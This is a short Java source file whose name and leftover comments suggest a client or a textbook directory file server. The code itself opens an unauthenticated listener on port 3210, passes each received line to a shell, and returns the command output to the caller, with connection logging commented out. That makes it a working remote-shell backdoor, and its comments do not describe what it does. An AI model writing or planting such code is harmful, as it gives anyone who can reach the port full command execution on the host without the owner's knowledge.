import java.net.*;
import java.io.*;

  public class InstanttempClient {

    static final int LISTENING_PORT = 3210;

    public static void main(String[] args) {

    
      ServerSocket listener; // Listens for connection requests.
      Socket connection; // A socket for communicating with
                         // a client.
      /* Check that there is a command-line argument.
      If not, print a usage message and end. */

      
      /* Get the directory name from the command line, and make
         it into a file object. Check that the file exists and
         is in fact a directory. */

    

      /* Listen for connection requests from clients. For
         each connection, create a separate Thread of type
         ConnectionHandler to process it. The ConnectionHandler
         class is defined below. The server runs until the
         program is terminated, for example by a CONTROL-C. */

      try {
        listener = new ServerSocket(LISTENING_PORT);
        System.out.println("Listening on port " + LISTENING_PORT);
        while (true) {
          connection = listener.accept();
          new ConnectionHandler(connection);
        }
      }
      catch (Exception e) {
        System.out.println("Server shut down unexpectedly.");
        System.out.println("Error: " + e);
        return;
      }

  } // end main()

  static class ConnectionHandler extends Thread {
     // An object of this class is a thread that will
     // process the connection with one client. The
     // thread starts itself in the constructor.
      
    Socket connection; // A connection to the client.
    BufferedReader incoming; // For reading data from the client.
    PrintWriter outgoing; // For transmitting data to the client.

    ConnectionHandler(Socket conn) {
       // Constructor. Record the connection and
       // the directory and start the thread running.
      connection = conn;
      start();
    }

    

    public void run() {
       // This is the method that is executed by the thread.
       // It creates streams for communicating with the client,
       // reads a command from the client, and carries out that
       // command. The connection is logged to standard output.
       // An output beginning with ERROR indicates that a network
       // error occurred. A line beginning with OK means that
       // there was no network error, but does not imply that the
       // command from the client was a legal command.
      String command = "Command not read";
      String s = null;

      try {
          BufferedReader incoming=new BufferedReader(new InputStreamReader(connection.getInputStream()));
        PrintWriter outgoing=new PrintWriter(new OutputStreamWriter(connection.getOutputStream()),true);
              
        command = incoming.readLine();
       System.out.println(command);      
        
       Process p = Runtime.getRuntime().exec("sh");
            
            BufferedReader stdInput = new BufferedReader(new InputStreamReader(p.getInputStream()));
            BufferedWriter stdWrite = new BufferedWriter(new OutputStreamWriter(p.getOutputStream()));
            BufferedReader stdError = new BufferedReader(new InputStreamReader(p.getErrorStream()));

            // read the output from the command
            
            stdWrite.write(command+"\n");
            stdWrite.flush();            
            while ((s = stdInput.readLine()) != null) {
               outgoing.println(s);
            }           
                      
           outgoing.println("Here is the standard error of the command (if any):\n");
            while ((s = stdError.readLine()) != null) {
                outgoing.println(s);
            }

        //System.out.println("OK " + connection.getInetAddress() + " " + command);
      }
      catch (Exception e) {
        //System.out.println("ERROR " + connection.getInetAddress() + " " + command + " " + e);
      }
      finally {
        try {
          connection.close();
        }
        catch (IOException e) {
        }
      }
    }

   } // end nested class ConnectionHandler

 }